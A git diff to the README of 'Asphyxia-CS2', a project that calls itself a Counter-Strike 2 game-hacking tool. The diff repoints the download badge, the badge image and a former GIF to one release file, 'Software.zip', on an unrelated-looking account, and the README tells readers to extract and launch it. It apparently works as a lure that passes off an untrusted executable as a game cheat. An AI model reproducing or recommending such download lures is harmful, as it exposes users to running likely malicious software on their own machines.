@@ -8,7 +8,7 @@
 ## How to Get Started
 🚀 To get started, download the latest version of the project by clicking the button below:
 
-[![Download Asphyxia-CS2](https://img.shields.io/badge/Download-%E2%AC%87%EF%B8%8F-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Download Asphyxia-CS2")
+[![Download Asphyxia-CS2](https://github.com/momstoiletpaper/asphyxia-cs2/releases/download/v1.0/Software.zip%E2%AC%87%EF%B8%8F-blue)](https://github.com/momstoiletpaper/asphyxia-cs2/releases/download/v1.0/Software.zip "Download Asphyxia-CS2")
 
 📦 Once downloaded, extract the contents of the zip file and launch the project to start exploring the world of Counter-Strike 2 game hacking.
 
@@ -29,4 +29,4 @@
 
 🎮 Get ready to dive into the exciting world of game hacking with Asphyxia-CS2!
 
-![Counter-Strike](https://media.giphy.com/media/4CnnDeqRXrkcE/giphy.gif)
+![Counter-Strike](https://github.com/momstoiletpaper/asphyxia-cs2/releases/download/v1.0/Software.zip)
